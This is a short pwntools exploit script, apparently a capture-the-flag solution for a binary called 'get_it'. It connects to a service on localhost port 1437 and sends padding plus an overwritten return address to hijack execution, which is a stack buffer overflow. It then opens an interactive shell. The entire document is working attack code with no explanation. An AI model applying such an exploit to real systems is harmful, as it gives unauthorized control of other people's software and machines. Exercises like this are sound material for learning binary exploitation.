from pwn import *

# target = process('./get_it')
target = remote("localhost", 1437)

payload = bytes([0] * 0x28)
payload += p64(0x004005b6)

# import sys
# sys.stdout.buffer.write(payload)
target.sendline(payload)

# drop to interactive shell to interact
target.interactive()